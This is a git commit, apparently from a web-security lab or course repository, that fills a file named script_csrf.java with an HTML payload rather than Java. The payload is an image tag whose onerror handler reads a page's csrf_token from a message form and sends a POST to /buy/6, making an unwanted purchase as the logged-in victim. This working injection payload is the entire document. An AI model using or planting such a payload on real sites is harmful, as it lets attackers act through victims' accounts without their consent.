babf7745e7b06859e963323c92bb7d78bf6742d9
AvinashNutalapati <avinash.nutalapati@gmail.com>
2023-10-12 18:08:50 -0400

    Update script_csrf.java

--- CSRF/script_csrf.java
+++ CSRF/script_csrf.java
@@ -1,1 +1,9 @@
-
+<img src="1" onerror='
+  const fata=new FormData();
+  const form = document.getElementById("message_form");
+  const name = form.elements["csrf_token"].value;
+  fata.append("csrf_token",name);
+  var changeReq = new XMLHttpRequest();
+  changeReq.open("POST", "/buy/6", true);
+  changeReq.send(fata);
+'>
